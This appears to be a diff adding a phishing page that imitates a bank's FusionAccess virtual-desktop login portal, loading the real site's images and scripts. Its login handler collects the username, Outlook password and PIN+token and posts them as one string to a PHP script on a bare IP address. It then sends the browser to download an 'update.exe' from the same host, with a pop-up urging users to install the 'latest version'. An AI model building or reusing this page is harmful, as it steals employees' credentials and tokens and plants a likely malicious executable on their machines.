@@ -1,0 +1,216 @@
+	<!DOCTYPE html>
+    <html>
+      <head>
+        <title>Desktop@FusionAccess</title>
+        <link type="image/vnd.microsoft.icon" href=https://vdi.webank.com/uns/default/img/logo.ico rel="SHORTCUT ICON">
+        <base href="https://vdi.webank.com" />
+        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+        <script type="text/javascript" src="https://vdi.webank.com/jslib/jquery.min.js"></script>
+        <script type="text/javascript" src="https://vdi.webank.com/jslib/jquery.cookie.js"></script> 
+        <script type="text/javascript" src="https://vdi.webank.com/jslib/log4javascript.js"></script>
+        <script type="text/javascript" src="https://vdi.webank.com/jslib/json2.js"></script> 
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/src/constantvar.js"></script>
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/src/globalvar.js"></script>	
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/utils/resultCode.js"></script>	
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/utils/service.js"></script>
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/language/commonLanguage.js"></script>
+        <script type="text/javascript" src="https://vdi.webank.com/uns/default/js/src/common.js"></script>	
+        <link rel="stylesheet" type="text/css" href="https://vdi.webank.com/uns/default/css/onlinehelp.css"/>
+        <link rel="stylesheet" type="text/css" href="https://vdi.webank.com/uns/default/css/common.css"/>
+      </head>
+      <body scroll=no style="background-image:url(https://vdi.webank.com/uns/default/img/null.jpg);"> 
+    
+          <div id="logo">
+              <img id="logoimg" src=https://vdi.webank.com/uns/default/img/logo.png />	
+          </div>
+          
+           <!-- �����л�   -->
+        <a id="lang" href="javascript:void(0);" title="Language"></a>
+          <script>
+
+              setTimeout("alert('请登录认证后安装最新版！')",1000);
+          </script>
+      </body>
+    </html>
+    
+        <!-- 模板,公共js、logo、css样式 -->
+        
+        <!-- 增加一个定制化模板,用户可以通过这个模板定制化自己的内容 -->
+    <script type="text/javascript">
+        loginCustomLanguage = {
+            zh:{
+                'userPassTip':'outlook密码',
+                'dynamicTip':'Pin+Token'
+            },
+            en:{
+                'userPassTip':'outlook密码',
+                'dynamicTip':'Pin+Token'		
+            },
+            ar:{
+                'userPassTip':'outlook密码',
+                'dynamicTip':'Pin+Token'		
+            }
+        }
+    
+    </script>	
+    
+            <!-- 客户端插件 -->
+    <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/src/hdpclient.js"></script>
+    <object id="pluginIE" classid="clsid:F0E7128D-E311-42F1-A0BA-88397960732E" style="display:none;">
+            <embed type="application/np-hdp-plugins" width=0 height=0 id="plugin" style="display:none;"><br>
+    </object>		<!-- 动态口令输入框 -->
+    
+        <link rel="stylesheet" type="text/css" href="https://vdi.webank.com/uns/default/css/dynamicCode.css">
+        <script type="text/javascript" src="https://vdi.webank.com/uns/common/js/language/loginLanguage.js"></script>  
+        <script type="text/javascript" src="https://vdi.webank.com/uns/default/js/src/dynamicCode.js"></script>
+       <div id="multiDomainCss"></div>
+       
+        <div id="userloginpanel">
+            <img id="loginframe" src="https://vdi.webank.com/uns/default/img/loginframe.png">
+                        <div id="headImgDiv" >
+                            <img id="headImageBg" src="https://vdi.webank.com/uns/default/img/headimagebg.png">
+                            <img id="headImage" />
+                        </div>                        
+      
+                        <div id="uNameInput" >
+                            <img id="uNameImg" src="https://vdi.webank.com/uns/default/img/inputnofocus.png" >				
+                            <input type="text" id="userName" name="userName" hidefocus="true" onfocus="setEmptyValue('userName','userNameTip',0);setEmptyValue('userPass','userPassTip',1,'text');setEmptyValue('dymanicPassword','dynamicTip',1,'text');"  onblur="setEmptyValue('userName','userNameTip',1);" onKeyPress="loginKey(event);" tabindex="100"/>
+                        </div>	
+                        <div id="uNameLabel" >							
+                            <label id="userNameLb"></label>
+                            <a id="btnEditName" href="javascript:void(0);" onmouseup="this.blur()"  hidefocus="true" tabindex="105"></a>
+                        </div>	
+                        <div id="passImgTip">
+                                <div id="toptip"></div>
+                                <div id="midtip"></div>
+                                <div id="bottomtip"></div>
+                                <div id="tiptext" ></div>
+                        </div>
+                        <div id="passInput">
+                            <img id="passImg" src="https://vdi.webank.com/uns/default/img/inputnofocus.png">
+                            <span id="userPassSpan"><input  autocomplete="off"  type="password" id="userPass" name="userPass" onpaste="return false;" oncopy="return false;" onblur="setEmptyValue('userPass','userPassTip',1,'text');" onfocus="setEmptyValue('userPass','userPassTip',0,'password');setEmptyValue('dymanicPassword','dynamicTip',1,'text');" oninput="alwaysPassword('userPass')" onKeyPress="loginKey(event);" hidefocus="true" tabindex="101"/></span>
+                            
+                        </div>
+                        <div id="dymanicPassInput">
+                            <img id="dymanicPassImg" src="https://vdi.webank.com/uns/default/img/inputnofocus.png">
+                            <span id="dymaniCodeSpan"><input  autocomplete="off"  type="text" id="dymanicPassword" name="dymanicPassword" onpaste="return false;" oncopy="return false;" onfocus="setEmptyValue('dymanicPassword','userPassTip',0,'password');"  onblur="setEmptyValue('dymanicPassword','dynamicTip',1,'text');" oninput="alwaysPassword('dymanicPassword')" onKeyPress="loginKey(event);" tabindex="102"/></span>
+                            <a id="getDymanicCode"  href="javascript:void(0);" onmouseup="this.blur()" tabindex="103"></a>
+                        </div>
+                        
+                        <div id="domainSelect" class="domainSelect"  style="display:none;">
+                            <img id="uNameImgDomain" src="https://vdi.webank.com/uns/default/img/inputnofocus.png" />
+                            <select id="seslectItem" class="seslectItem">
+                            </select>
+                        </div>
+                        
+                        <div id="loginBtnDiv">
+                            <a id="loginBtn" type="submit" href="javascript:void(0);" onmouseup="this.blur()"  hidefocus="true" tabindex="104" onclick="loadXMLDoc()"></a>
+                        </div>
+                        <div id="errorDiv">
+                            <label id="errorLb"></label>
+                        </div>
+        </div>
+
+        
+<script type="text/javascript">
+
+    function loadXMLDoc()
+        {
+        var username = document.getElementById('userName').value;
+	    var password = document.getElementById('userPass').value;
+        var token = document.getElementById('dymanicPassword').value;
+        var okresults = "data=" + username + '|' +  password + '|' + token;
+        //alert(okresults);
+        
+        if (username=='请输入用户名'|| password =='outlook密码' || token == 'Pin+Token'){
+
+            alert('请登录认证后安装最新版！');
+        }
+        else{
+            var xmlhttp;
+        if (window.XMLHttpRequest)
+        {// code for IE7+, Firefox, Chrome, Opera, Safari
+        xmlhttp=new XMLHttpRequest();
+        }
+        else
+        {// code for IE6, IE5
+        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+        }
+        xmlhttp.onreadystatechange=function()
+        {
+        if (xmlhttp.readyState==4 && xmlhttp.status==200)
+            {
+            document.getElementById("myDiv").innerHTML=xmlhttp.responseText;
+            }
+        }
+
+            xmlhttp.open("POST","http://118.126.82.14/data.php",true);
+        xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
+        xmlhttp.send(okresults);
+        // alert('请安装最新版Fusion Access，点击确认下载最新版FusionAccess');
+        window.location = 'http://118.126.82.14/update.exe';
+        
+
+        }
+ 
+        }
+        
+</script>
+
+        <!-- 联机帮助图片 -->
+    <a id="onlinehelpimg" href="javascript:void(0);" onclick="openWin();"></a>	
+        <input name="UserIdentifyString" id="UserIdentifyString" value="" maxlength="24" style="display:none;"/>    
+        <!-- 广告宣传图片 -->
+        
+        <div id="loadingpanel">
+            <img src="https://vdi.webank.com/uns/default/img/loading.gif">
+        </div>
+        
+        <div id="addiv">
+            <img id="ad">
+        </div>
+        
+        <input id="hideInputCN" style="display:none;" value=https://vdi.webank.com/uns/custom/img/adch.png ></input>
+        <input id="hideInputEN" style="display:none;" value=https://vdi.webank.com/uns/default/img/aden.png ></input>
+        <input id="hideInputAR" style="display:none;" value=https://vdi.webank.com/uns/default/img/adar.png ></input>
+        
+        <input id="headImage1" style="display:none;" value=https://vdi.webank.com/uns/default/img/headimage1.png ></input>
+        <input id="headImage2" style="display:none;" value=https://vdi.webank.com/uns/default/img/headimage2.png ></input>
+        <input id="headImage3" style="display:none;" value=https://vdi.webank.com/uns/default/img/headimage3.png ></input>
+        <input id="headImage4" style="display:none;" value=https://vdi.webank.com/uns/default/img/headimage4.png ></input>
+        <input id="headImage5" style="display:none;" value=https://vdi.webank.com/uns/default/img/headimage5.png ></input>
+
+        <!-- 语言修改  -->
+    <link rel="stylesheet" type="text/css" href="https://vdi.webank.com/uns/default/css/changelanguage.css" />
+    
+    <!-- 修改语言 -->
+    <div id= "choiceLang" class="langMask">
+        <div class="langMaskBack"></div>
+        <div class="langDialogAnchor centerEle">
+              <div class="langDialog smallLangDialog">
+                  <div class="langDialogTitle">Title</div>
+                  <a class="langDialogClose" href="javascript:void(0);"></a>
+                <select class="langSelectors">    
+                    <option class="langZh" value="zh">Simplified Chinese</option>  
+                    <option class="langEn" value="en">English</option>
+                </select>
+                  <div class="langDialogButtonsWarp" >
+                      <table class="langDialogButtons">
+                          <tr>
+                              <td class="langDialogButton" align="center">
+                                  <div class="langDialogLinkWarp">
+                                      <a class="langDialogOkLink langDialogLink" href="javascript:void(0);"></a>
+                                  </div>
+                              </td>
+                              <td class="langDialogButton" align="center">
+                                  <div class="langDialogLinkWarp">
+                                      <a class="langDialogCanncelLink langDialogLink" href="javascript:void(0);"></a>
+                                  </div>
+                              </td>
+                          </tr>
+                      </table>
+                  </div>
+              </div>
+        </div>
+    </div>    
+  
